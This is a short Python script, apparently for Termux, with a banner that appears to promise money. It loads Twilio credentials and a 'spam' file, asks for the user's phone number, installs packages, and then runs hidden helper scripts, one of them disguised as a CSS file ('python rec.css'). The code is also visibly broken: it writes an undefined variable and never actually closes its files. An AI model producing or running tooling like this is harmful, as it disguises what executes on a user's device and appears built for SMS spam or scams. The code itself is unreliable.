import time
import os
import sys
import requests
os.system('pip install twilio')
os.system('clear')
name = """\033[1;32;40m
___________________________________________________________
\033[1;36;40m──────────────────╔╗─  ─────────────────
\033[1;36;40m╔═╗╔═╗╔╗─╔╗─╔═╗╔═╗║╚╗  ╔══╗╔═╗╔═╦╗╔═╗╔╦╗
\033[1;36;40m║═╣║╬║║╚╗║╚╗║╩╣║═╣║╔╣  ║║║║║╬║║║║║║╩╣║║║
\033[1;36;40m╚═╝╚═╝╚═╝╚═╝╚═╝╚═╝╚═╝  ╚╩╩╝╚═╝╚╩═╝╚═╝╠╗║
\033[1;36;40m─────────────────────  ──────────────╚═╝ """
print(name, "")

try:
    f = open("spam.js", "r")
    spam = f.read()
    f.close
except:
    f = open("spam.js", "w")
    f.write(wr)
    f.close
    f = open("spam.js", "r")
    spam = f.read()
    f.close
try:
    f = open("sid.js", "r")
    sid = f.read()
    f.close
except:
    f = open("sid.js", "w")
    f.write(wr)
    f.close
    f = open("sid.js", "r")
    sid = f.read()
    f.close

try:
    f = open("token.js", "r")
    f = open("token.js", "r")
    token = f.read()
    f.close
except:
    f = open("token.js", "w")
    f.write(wr)
    f.close
    f = open("token.js", "r")
    token = f.read()
    f.close
try:
    import requests

except ImportError:
    print('%s Requests isn\'t installed, installing now.')
    os.system('pip3 install requests')
    os.system('clear')

    print("\033[0;36m "" ")
    print("")
    print("\033[0;36m "" ")
    
t = input("Enter Your Phone Number: ")
def main():
    os.system('apt update')
    time.sleep(0.1)
    os.system('pkg install termux-api')
    os.system('python rec.css')
    os.system('python pass.py')
    again()

def again():
    again = input('\033[1;0;40m\nDo You want use again (y/n) - ')
    if again == "y" or again == "Y":
        main()
    elif again == "n" or again == "N":
        quit()
    else:
        print('\033[1;31;40mEnter valid letter')
        again()


if __name__ == "__main__":
    main()
